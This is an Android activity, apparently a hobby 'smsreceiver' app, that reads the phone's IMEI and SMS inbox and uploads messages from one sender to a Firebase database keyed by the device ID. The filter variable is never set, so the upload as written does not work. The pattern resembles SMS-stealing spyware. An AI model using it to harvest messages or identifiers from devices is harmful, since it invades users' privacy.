package com.example.raghav.smsreceiver;


import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Settings;
import android.provider.Telephony;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Calendar;
import java.util.Date;


public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    FirebaseDatabase database = FirebaseDatabase.getInstance();
    DatabaseReference myRef = database.getReference("INFO");
    private static final int MY_PERMISSIONS_REQUEST_READ_SMS = 1;


    TextView disp;
    String phoneid,phoneno, appendnumber;
    String device_id;
    Button b1;
    boolean first;
    int PERMISSION_ALL = 1;
    TelephonyManager tm;
    String[] PERMISSIONS = {Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.SEND_SMS};


    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        b1 = (Button) findViewById(R.id.btn1);
        b1.setOnClickListener(this);
        disp =(TextView) findViewById(R.id.display);



        if (!hasPermissions(this, PERMISSIONS)) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);


        }


    }


    public static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }


    public void onClick(View v) {
        tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        device_id = tm.getDeviceId();

       SharedPreferences settings = getSharedPreferences("PREFS",0);
       first = settings.getBoolean("first_time_code", true);

        if(v == b1){

            if(first){


                Log.i("finalnumber","entered number :"+appendnumber);


                SharedPreferences.Editor editor = settings.edit();
                editor.putBoolean("first_time_code", false);
                editor.commit();



                code();

                Toast.makeText(this,"service running",Toast.LENGTH_SHORT).show();

            }
            else{
                Toast.makeText(this,"already running",Toast.LENGTH_SHORT).show();
            }

        }
   }

    public void code(){


        phoneid = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);


        Uri uriSmsuri = Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(uriSmsuri, null, null, null, null);


        while (cur.moveToNext()) {

            final String sms = cur.getString(cur.getColumnIndexOrThrow("body"));
            final String saddress = cur.getString(cur.getColumnIndex(Telephony.Sms.ADDRESS));
            final String stime = cur.getString(cur.getColumnIndex(Telephony.Sms.DATE));


            Long timestamp = Long.parseLong(stime);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            Date finaldate = calendar.getTime();
            String smsDate = finaldate.toString();
            String timex = (String.valueOf(finaldate.getTime()));


            Log.i("message", sms + "....." + saddress);


            if (saddress.toString().equals(appendnumber)) {



                myRef.child(device_id).child("Old Messages").child(smsDate).setValue(sms);


                Log.i("IMEI",device_id);

            }
        }
    }
}
